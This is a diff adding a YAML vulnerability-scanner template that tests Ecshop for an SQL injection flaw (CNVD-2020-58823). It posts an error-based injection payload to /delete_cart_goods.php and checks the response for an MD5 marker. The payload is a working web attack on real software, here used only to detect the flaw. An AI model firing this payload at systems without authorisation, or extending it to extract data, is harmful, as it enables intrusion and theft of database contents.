@@ -1,0 +1,23 @@
+id: poc-yaml-ecshop-cnvd-2020-58823-sqli
+info:
+  name: Ecshop SQL注入漏洞(CNVD-2020-58823)
+  severity: high
+  tags:
+  - cnvd-2020-58823
+  - CNVD-2020-58823
+  finger: Ecshop
+  reference: []
+  description: null
+variables:
+  r1: random_int(40000, 44800)
+transport: http
+requests:
+- method: POST
+  path: /delete_cart_goods.php
+  headers: {}
+  data: id=0||(updatexml(1,concat(0x7e,(select%20md5({{.r1}})),0x7e),1))
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, substr(md5(r1),0,31))
+  output: []
